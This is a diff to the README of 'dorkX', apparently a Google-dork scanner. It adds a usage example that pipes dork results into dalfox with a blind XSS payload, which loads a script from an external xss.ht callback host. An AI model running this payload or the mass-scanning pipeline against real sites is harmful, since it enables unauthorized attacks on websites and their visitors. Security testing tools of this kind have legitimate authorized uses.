@@ -30,6 +30,12 @@ Pipe different tools with google dork Scanner
 
 ### Usage:
 
+**Blind XSS**
+
+`zoid@MSI ~/dorkX> ./dorkX -dorks dorks.txt -concurrency 100  | dalfox pipe -b '"><script src=https://z0id.xss.ht></script>'`
+
+[![Image from Gyazo](https://i.gyazo.com/f91681fb31ae64ad4f230afc77014be3.gif)](https://gyazo.com/f91681fb31ae64ad4f230afc77014be3)
+
 **XSS**
 
 `zoid@MSI ~/dorkX> ./dorkx -dorks dorks.txt | dalfox pipe`
